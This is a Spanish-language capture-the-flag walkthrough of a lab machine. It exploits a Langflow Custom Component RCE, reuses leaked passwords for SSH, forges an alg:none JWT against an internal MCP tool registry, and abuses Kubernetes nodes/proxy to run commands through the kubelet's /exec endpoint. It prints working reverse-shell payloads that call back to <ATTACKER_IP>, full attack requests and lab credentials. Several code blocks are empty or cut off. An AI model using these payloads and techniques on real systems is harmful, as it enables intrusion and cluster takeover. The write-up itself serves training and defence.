Langflow 1.8.2 accesible a través de un subdominio comodín (`flow.fireflow.htb`) es vulnerable a **CVE-2026-33017** (GHSA-vwmf-pq79-vjvx), lo que permite ejecución arbitraria de Python mediante un flujo Custom Component elaborado y da una reverse shell como `www-data`. El entorno del servicio Langflow filtra `LANGFLOW_SUPERUSER_PASSWORD`, que está reutilizada como contraseña del SO para el usuario `nightfall`. La escalada de privilegios es la mitad interesante: un servidor MCP interno corriendo en un nodo de Kubernetes acepta JWTs con `alg: none`, lo que permite un token de admin falsificado; registrar una herramienta con código Python arbitrario da RCE dentro del pod MCP; el token de la service account del pod tiene `get` sobre `nodes/proxy`, que se abusa para alcanzar la API del kubelet en el puerto 10250 directamente; desde ahí, se usa el endpoint WebSocket `/exec` para ejecutar comandos dentro del pod del Prometheus node-exporter montado sobre el host, leyendo `/root/root.txt` en el nodo subyacente como root.

**Langflow 1.8.2**. Langflow es un constructor visual de código abierto para flujos de agentes LLM; los flujos son documentos JSON que describen un grafo de componentes (nodos LLM, plantillas de prompt, retrievers, bloques de código personalizado). El hecho relevante para un atacante es que Langflow soporta **Custom Components** — nodos de flujo cuyo campo `code` contiene código fuente Python que Langflow compila y ejecuta en el servidor cuando el flujo corre. Las versiones ≤1.8.2 exponen esta funcionalidad en los endpoints de flujo con sandboxing insuficiente, que es la sustancia de **CVE-2026-33017** (GHSA-vwmf-pq79-vjvx).

## Explotación — CVE-2026-33017 (RCE en Custom Component de Langflow)

### Entendiendo la vulnerabilidad

El modelo de datos de Langflow representa cada componente como un objeto JSON con un `template` que contiene un campo `code`. Cuando un flujo se ejecuta, el servidor lee el campo `code` de cada nodo, lo compila dinámicamente como Python (esencialmente `exec()`) e instancia la clase resultante. Cualquier cosa que el código Python haga como efecto secundario de ser compilado e instanciado — imports, llamadas a funciones a nivel de módulo, lógica del constructor — corre en el servidor con los privilegios del proceso de Langflow (`www-data` aquí).

La vulnerabilidad es que el endpoint público de ejecución de flujos (rutas adyacentes a `/api/v1/flows/public_flow/<UUID>`) no requiere autenticación, pero sí permite al solicitante **enviar su propia definición de flujo** — sobreescribiendo los componentes del flujo guardado con los proporcionados por el atacante. La combinación — control no autenticado sobre qué código se ejecuta — es RCE directo.

### Elaborando el payload

El Custom Component vulnerable solo necesita definir una subclase de `lfx.custom.custom_component.component.Component` con la interfaz esperada. Cualquier código fuera de la clase — incluidos los imports a nivel de módulo y las llamadas con efectos secundarios — corre en tiempo de compilación/import. Un one-liner de reverse shell envuelto en `os.popen()` a nivel de módulo es por tanto suficiente:

```python
import os

_proof = os.popen("bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'").read().strip()

from lfx.custom.custom_component.component import Component
from lfx.io import Output
from lfx.schema.data import Data

class ExploitComp(Component):
    display_name = "X"
    outputs = [Output(display_name="O", name="o", method="r")]
    def r(self) -> Data:
        return Data(data={})
```

La shell conecta de vuelta antes incluso de que el resto del módulo termine de cargar — `os.popen()` se bloquea hasta que el subproceso bash sale, y bash con `-i` corriendo sobre `/dev/tcp/...` se bloquea durante toda la vida de la conexión. Langflow acaba esperando en el import, pero para entonces ya tenemos la shell.

Envuelto dentro del JSON de flujo completo de Langflow que espera el endpoint:

```json
{
  "data": {
    "nodes": [{
      "id": "Exploit-001",
```

## Movimiento lateral — `www-data` → `nightfall`

### Disclosure de variables de entorno

Una comprobación refleja tras cualquier shell es `env`, porque los servicios que corren bajo systemd reciben rutinariamente credenciales a través de variables de entorno definidas en el archivo de unidad o su drop-in `EnvironmentFile=`:

```bash
env
LANGFLOW_SUPERUSER=langflow
LANGFLOW_SUPERUSER_PASSWORD=n1ghtm4r3_b4_n1ghtf4ll
LANGFLOW_SECRET_KEY=XgDCYma6JZzT3XXyePTbr4vgWrrZ4Vzz-PCQ4PXfKgE
LANGFLOW_CORS_ORIGINS=https://flow.fireflow.htb,https://fireflow.htb
[...]
```

La `LANGFLOW_SUPERUSER_PASSWORD` es la contraseña de admin de la aplicación Langflow — no una contraseña del SO por diseño. Pero el valor (`n1ghtm4r3_b4_n1ghtf4ll`) tiene la estructura de juego de palabras de una contraseña que un operador eligió para sí mismo, no un secreto aleatorio generado por un sistema de despliegue. Y hay un usuario del sistema en la máquina cuyo nombre resulta ser una subcadena de esa contraseña:

```bash
cat /etc/passwd | grep "/bin/bash"
root:x:0:0:root:/root:/bin/bash
nightfall:x:1000:1000::/home/nightfall:/bin/bash
```

`nightfall` es el único usuario no root con shell de login, y la contraseña contiene literalmente la palabra *nightfall*. Probando la reutilización:

```bash
ssh nightfall@fireflow.htb
nightfall@fireflow.htb's password: n1ghtm4r3_b4_n1ghtf4ll
nightfall@fireflow:~$ cat user.txt
```

Este es el acceso inicial propiamente dicho. La reutilización de credenciales entre el superusuario de una aplicación y una cuenta del SO es el mismo patrón recurrente de engagements anteriores — un operador elige una contraseña, la establece en la aplicación y la reutiliza para SSH porque recordar dos contraseñas es más difícil.

## Escalada de privilegios — `nightfall` → `root` (a través del clúster de Kubernetes)

La enumeración estándar de privesc como `nightfall` no produjo nada obvio — sin entradas de sudo, sin anomalías SUID, sin archivos tocados por cron escribibles. El avance llegó al darme cuenta de que la máquina corre un pequeño clúster de Kubernetes (k3s), y la escalada real vive enteramente en ese lado.

### Descubriendo el servidor MCP

Una búsqueda de archivos dirigida filtró el ruido de los directorios de la distro y de paquetes:

```bash
find / -name "*.json" 2>/dev/null | grep -Ev "^/opt/langflow/venv|^/usr|^/var"
/home/nightfall/.mcp/config.json
```

```bash
cat /home/nightfall/.mcp/config.json
{
  "server": "http://10.129.32.226:30080",
  "status_endpoint": "/api/v1/version",
  "user": "langflow-bot",
  "password": "Langfl0w@mcp2026!"
}
```

Tres hechos útiles a la vez: la máquina aloja un **segundo servicio** en una IP interna (`10.129.32.226`, una IP distinta de la externa — casi con seguridad una IP de nodo k3s en una interfaz separada), habla un dialecto **MCP (Model Context Protocol)** en un puerto no estándar (30080, que tiene la forma de un **NodePort** de Kubernetes), y hay un **par de credenciales** para él que el atacante no tiene que adivinar.

Un escaneo de procesos reveló la cara local de este servicio:

```bash
ps aux | grep uvicorn
nightfa+  3940  /usr/local/bin/python3.11 /usr/local/bin/uvicorn main:app --host 0.0.0.0 --port 8080
```

Leer el bloque de entorno del proceso saca a la luz el contexto de Kubernetes dentro del que corre el servicio:

```bash
cat /proc/3940/environ | tr '\0' '\n'
HOSTNAME=mcp-server-54464cb475-29ztf
KUBERNETES_PORT_443_TCP_ADDR=10.43.0.1
KUBERNETES_SERVICE_HOST=10.43.0.1
MCP_SERVER_SERVICE_HOST=10.43.250.195
MCP_SERVER_SERVICE_PORT=8080
[...]
```

Tres observaciones concretan la imagen de Kubernetes:

- **`HOSTNAME=mcp-server-54464cb475-29ztf`** es un patrón de nombrado de pod de Kubernetes (`<deployment>-<replicaset>-<pod>`), confirmando que el servicio corre en un pod.
- **`KUBERNETES_SERVICE_HOST=10.43.0.1`** es la IP canónica intra-clúster del servidor de la API de Kubernetes (por defecto en k3s).
- **`MCP_SERVER_SERVICE_HOST=10.43.250.195`** es la ClusterIP interna del clúster para el servicio MCP, accesible desde cualquier pod (y desde esta máquina, porque la máquina aloja el clúster).

El servicio MCP es accesible de dos formas: externamente en el NodePort `30080`, e internamente en la ClusterIP `10.43.250.195:8080`. Ambas van al mismo pod.

### Enumeración de la API del MCP

Acceder al endpoint de versión sin auth:

```bash
curl http://10.43.250.195:8080/api/v1/version
{
  "service": "MCP AI Tool Registry",
  "version": "0.1.0",
  "auth": {
    "type": "JWT",
    "header": "Authorization: Bearer <token>",
    "supported_algorithms": ["HS256", "none"]
  },
  "docs": "/docs",
  "endpoints": [
    "POST /mcp                        [MCP JSON-RPC 2.0]",
    "POST /api/v1/auth",
    "GET  /api/v1/tools",
    "POST /api/v1/tools               [admin]"
  ]
}
```

La respuesta de versión es su propia disclosure de vulnerabilidad. `"supported_algorithms": ["HS256", "none"]` es la mala configuración de JWT de manual — el servidor documenta que aceptará **tokens sin firma** como válidos. Combinado con el control de admin basado en rol (`POST /api/v1/tools [admin]`), esto es un bypass de privilegios de un solo paso: cualquier llamante puede falsificar un token `alg:none` con `role: admin` y acceder al endpoint de admin.

El esquema OpenAPI obtenido de `/openapi.json` confirmó las formas de las peticiones:

- `POST /api/v1/auth` → `{username, password}` → devuelve un token de acceso.
- `GET /api/v1/tools` → lista las herramientas registradas.
- `POST /api/v1/tools` → `{name, description, code, inputSchema}` → solo admin, **registra una nueva herramienta con Python arbitrario en `code`**.
- `POST /mcp` → endpoint MCP JSON-RPC, usado para invocar las herramientas registradas.

La forma de `POST /api/v1/tools` es la primitiva de privesc: el campo literalmente llamado `code` acepta Python arbitrario que se ejecuta cuando la herramienta corre. Lo único que estorba es el control `[admin]`.

### Falsificación de JWT vía `alg: none`

La forma estándar de empezar era autenticarse con las credenciales descubiertas:

```bash

     -H "Content-Type: application/json" \
     -d '{"username":"langflow-bot","password":"Langfl0w@mcp2026!"}'
{"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoidXNlciJ9.RenGdHutrKPCOWjwYSJex8C_uMSmy7I8AMkhmTwf9Ps","token_type":"bearer"}
```

Decodificar el token en jwt.io reveló la estructura:

```text

Payload : { "sub": "langflow-bot", "role": "user" }
```

Probando el control de rol con este token de rol user:


Control confirmado. Ahora la falsificación: cambiar la cabecera a `alg: none`, cambiar el rol del payload a `admin` y producir un token cuyo tercer segmento (la firma) esté vacío.

Nótese el `.` final — el segmento de firma existe pero está vacío, que es lo que `alg: none` requiere. Una biblioteca de JWT que respete este valor de algoritmo saltará la verificación de firma por completo:

```bash

curl -X POST http://10.43.250.195:8080/api/v1/tools \
     -H 'Content-Type: application/json' \
     -H "Authorization: Bearer $priv_token" \
     -d '{"ping_host":"127.0.0.1"}'
{"detail":[{"type":"missing","loc":["body","name"],"msg":"Field required"...}]}
```

El error 422 significa que **el control de rol ha desaparecido** — el servidor pasó la auth y ahora se queja de campos del cuerpo que faltan. El bypass funciona.

### RCE por registro de herramienta — desacoplando del handler HTTP

El payload de `POST /api/v1/tools` acepta un campo Python `code` que se ejecuta cuando la herramienta corre. Lo ingenuo es meter ahí `os.system("bash -c 'bash -i >& /dev/tcp/...'")`, pero eso tiene un modo de fallo sutil: el handler de la petición HTTP que procesa el registro (o la llamada MCP que invoca la herramienta) desmonta su árbol de procesos cuando la respuesta retorna, lo que mata cualquier proceso hijo que haya lanzado. La reverse shell muere casi de inmediato.

La solución es **desacoplar** el proceso hijo del ciclo de vida del handler. En Python, la forma limpia es `subprocess.Popen([...], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)` — una vez que `Popen` retorna, el hijo es un proceso completamente independiente y el padre puede morir sin afectarlo. Para mejorar el hijo a un TTY, el propio hijo corre un pequeño arnés de Python que llama a `pty.spawn` tras conectarse:

```python
import subprocess, os, sys
subprocess.Popen([
    "python3", "-c",
    "import socket,subprocess,os,pty;"
    "s=socket.socket();"
    "s.connect((\"<ATTACKER_IP>\",5555));"
    "[os.dup2(s.fileno(),f) for f in (0,1,2)];"
    "pty.spawn(\"/bin/bash\")"
], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
print("shell spawned")
```

Registrando esto como herramienta vía el token falsificado privilegiado:

```bash
curl -X POST http://10.43.250.195:8080/api/v1/tools \
     -H 'Content-Type: application/json' \
     -H "Authorization: Bearer $priv_token" \
     -d '{
       "name": "pwn2",
       "description": "x",
       "inputSchema": {},
       "code": "import subprocess,os,sys;subprocess.Popen([\"python3\",\"-c\",\"import socket,subprocess,os,pty;s=socket.socket();s.connect((\\\"<ATTACKER_IP>\\\",5555));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\\\"/bin/bash\\\")\"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL);print(\"shell spawned\")"
     }'
{"status":"registered","name":"pwn2"}
```


Y la herramienta se invocó a través del endpoint MCP JSON-RPC:

```bash
{"jsonrpc":"2.0","id":1,"result":{"content":[{"type":"text","text":"shell spawned\n"}],"isError":false}}
```

La conexión de vuelta aterrizó — pero **dentro del pod MCP**, no en el host:

Esta es la segunda shell del engagement, y es la más interesante porque es el punto de entrada al clúster de Kubernetes. El host sigue siendo solo-root desde aquí; estamos dentro de un contenedor.

### Extracción del token de la service account

Cada pod de Kubernetes recibe un **token de service account** montado como archivo en una ruta bien conocida dentro del contenedor. Esta es la identidad del pod ante el servidor de la API de Kubernetes — un JWT firmado por la CA interna del clúster que otros componentes (incluido el propio servidor de la API) aceptan como prueba de qué service account está haciendo una petición:

```bash
ls /run/secrets/kubernetes.io/serviceaccount/
ca.crt  namespace  token
cat /run/secrets/kubernetes.io/serviceaccount/token
eyJhbGciOiJSUzI1NiIsImtpZCI6ImFQRTZ5R3JrSUpadmdid19HcHBTRTBYUFJZWUxqeGcxUHJIaFJjTEVSdm8ifQ.eyJhdWQiOlsi[...truncated]
```

El token, guardado en `new_token` para uso posterior, es con lo que se autenticarán las llamadas posteriores a la API de Kubernetes.

### Enumerando los permisos RBAC

Kubernetes provee una API específica para "qué puedo hacer con esta identidad": **SelfSubjectRulesReview**. Devuelve la lista completa de permisos concedidos al sujeto llamante en un namespace dado.

```bash
  {
```

Entre las reglas devueltas, una es catastrófica:

```json
{ "verbs": ["get"], "apiGroups": [""], "resources": ["nodes/proxy"] }
```

### Por qué `nodes/proxy` es catastrófico

El subrecurso `proxy` sobre los recursos de Kubernetes es un reenvío HTTP transparente. Cuando haces `GET /api/v1/nodes/<node>/proxy/<path>`, el servidor de la API proxea la petición al **kubelet** de ese nodo y devuelve su respuesta verbatim. El kubelet es el agente que corre en cada nodo de Kubernetes y que gestiona los pods en nombre del servidor de la API — tiene control equivalente a root sobre todo lo del nodo, incluida la capacidad de arrancar, parar y **hacer exec** en cualquier pod.

El hecho crítico: **el kubelet no aplica el RBAC de Kubernetes**. El RBAC lo aplica el servidor de la API; una vez que una petición llega al kubelet (que es lo que hace `nodes/proxy`), el kubelet confía en quienquiera que el servidor de la API le haya reenviado la petición. Eso significa que un permiso `get nodes/proxy` — que suena modesto, como "ver el estado del nodo" — en realidad concede las **capacidades completas de la API del kubelet**, incluidas:

- `GET /pods` → listar cada pod corriendo en el nodo, incluido a qué namespaces pertenecen y qué montan.
- `POST /exec/<namespace>/<pod>/<container>` → ejecutar comandos arbitrarios en cualquier pod.
- `GET /logs/<namespace>/<pod>` → leer los logs de cada pod.

El RCE mínimo viable del kubelet es por tanto:

1. Listar los pods del nodo vía `nodes/proxy/pods`.
2. Identificar un pod que monte recursos a nivel de host o corra con capacidades privilegiadas.
3. Hacer exec en ese pod vía `nodes/proxy/exec/...` (proxeado al propio endpoint `/exec` del kubelet en el puerto 10250).

El que destaca es **`prometheus-prometheus-node-exporter-nmntq`**. El node-exporter de Prometheus existe específicamente para recolectar métricas a nivel de host — CPU, memoria, disco, red, uso del sistema de archivos. Para hacer ese trabajo, el despliegue por defecto del chart de Helm monta el sistema de archivos raíz del host en `/host/root` dentro del contenedor y corre el pod **como root con `hostPID: true`**. El contenedor es, por diseño, un lector sin restricciones del sistema de archivos del host subyacente.

Desde dentro de ese pod, **`/host/root/root/root.txt` es literalmente el `/root/root.txt` del host**.

### `/exec` del kubelet vía WebSocket

El salto final es invocar el endpoint `/exec` del kubelet para ejecutar un comando dentro del pod node-exporter. El kubelet escucha en el puerto 10250 con TLS; el endpoint `/exec` mejora la conexión a un WebSocket usando el subprotocolo **`v4.channel.k8s.io`**, que multiplexa stdin/stdout/stderr/resize en un único canal. Este es el mismo mecanismo que `kubectl exec` usa por debajo — la diferencia es que vamos a invocarlo directamente con un bearer token de service account en lugar de a través de `kubectl`.

`curl` no habla WebSockets limpiamente. **`websocat`** es la herramienta correcta — es básicamente `curl` para `ws://` y `wss://`, con soporte explícito para establecer subprotocolos.

Un `whoami` primero, para confirmar que el camino funciona y que somos root dentro del pod objetivo:

```bash
websocat --insecure \
         --header "Authorization: Bearer $new_token" \
         --protocol v4.channel.k8s.io \
         "wss://10.129.32.226:10250/exec/monitoring/prometheus-prometheus-node-exporter-nmntq/node-exporter?output=1&error=1&command=whoami"
root
```

`root` dentro del pod node-exporter, que (gracias al montaje del host) es también root sobre `/host/root/*` — el sistema de archivos del host. El exec final lee la flag de root del host:

```bash
websocat --insecure \
         --header "Authorization: Bearer $new_token" \
         --protocol v4.channel.k8s.io \
         "wss://10.129.32.226:10250/exec/monitoring/prometheus-prometheus-node-exporter-nmntq/node-exporter?output=1&error=1&command=cat&command=/host/root/root/root.txt"
```

Las convenciones de parámetros de URL para `/exec` merecen una nota: `command=` puede repetirse para pasar múltiples tokens de argv (`cat /host/root/root/root.txt` se convierte en `&command=cat&command=/host/root/root/root.txt`), `output=1` y `error=1` habilitan la multiplexación de stdout y stderr.

## Conclusiones clave

- **Los certificados TLS comodín pre-revelan subdominios.** Un SAN como `*.fireflow.htb` no solo permite cualquier subdominio en runtime; le dice a un atacante que el operador esperaba usar múltiples subdominios. Junto con la pista de UI "Open Agent", ese comodín fue todo el camino a `flow.fireflow.htb` sin necesidad de fuerza bruta de DNS.
- **Cualquier campo `code` en una API pública es RCE.** El diseño de Custom Component de Langflow es una herramienta para que usuarios avanzados extiendan la funcionalidad con Python. Expuesto sin límites de autenticación estrictos, es *también* una herramienta para que atacantes no autenticados hagan lo mismo. CVE-2026-33017 es la consecuencia predecible — y el mismo anti-patrón aparece en el endpoint `POST /api/v1/tools` del servidor MCP más adelante en la cadena.
- **El `alg:none` de JWT es un error de diseño documentado.** Cualquier biblioteca de JWT que por defecto honre la cabecera `alg` — incluido el valor `none` — está rota por diseño. Un servidor bien configurado hardcodea el algoritmo esperado y rechaza todo lo demás. Una biblioteca que anuncia `"supported_algorithms": ["HS256", "none"]` como funcionalidad les está diciendo a los atacantes que el bypass está listo.
- **Las variables de entorno de aplicación filtran credenciales de forma fiable.** Tanto el entorno del servicio Langflow (que filtró la contraseña del SO de `nightfall`) como el del servicio MCP (que expuso el contexto completo del pod de Kubernetes) dieron información crítica gratis. `cat /proc/<pid>/environ | tr '\0' '\n'` debería ser un reflejo en cualquier shell de post-explotación.
- **Los tokens de service account son la moneda de acceso inicial de Kubernetes.** Cualquier compromiso de pod da un JWT montado en `/run/secrets/kubernetes.io/serviceaccount/token` — ese JWT es la identidad del pod ante todo el clúster, y sus capacidades las determinan enteramente los bindings de RBAC que el admin del clúster montó. `SelfSubjectRulesReview` es lo primero que consultar: responde "¿qué puede hacer este token?" de forma definitiva, sin prueba y error.
- **`nodes/proxy` es el permiso de Kubernetes de alcance estrecho más peligroso.** Parece inofensivo en un binding porque el verbo es `get` y el recurso suena informativo. En la práctica concede toda la superficie de la API del kubelet — listado de pods, lectura de logs y **ejecución de comandos arbitrarios dentro de cualquier pod que el kubelet gestione**. Los bindings de RBAC que mencionan `nodes/proxy` deberían tratarse como equivalentes a cluster-admin desde la perspectiva de toma de control de nodos.
- **Los pods de monitorización privilegiados son el objetivo lateral universal.** Prometheus node-exporter, agentes de Datadog, forwarders de Splunk, Falco — cualquier cosa cuyo trabajo sea observar el estado a nivel de host necesita acceso a nivel de host. Los valores por defecto del chart de Helm de estas herramientas montan el sistema de archivos raíz y corren como root, lo que las convierte en el pod más potente del clúster desde la perspectiva de un atacante. Cualquier permiso RBAC que te permita hacer `exec` en pods de un nodo concede implícitamente root sobre ese nodo *si* hay un pod de monitorización programado allí.
- **Desacoplar procesos hijo es la diferencia entre un RCE que funciona y uno inestable.** Los canales de ejecución de código controlados por handlers HTTP de vida corta (Lambda, scopes de petición de FastAPI, handlers JSON-RPC) desmontan sus árboles de procesos de forma agresiva. La disciplina de envolver siempre los payloads post-RCE en `subprocess.Popen(..., stdout=DEVNULL, stderr=DEVNULL)` o `nohup` + `&` ahorra tiempo de depuración a lo largo de muchos engagements.
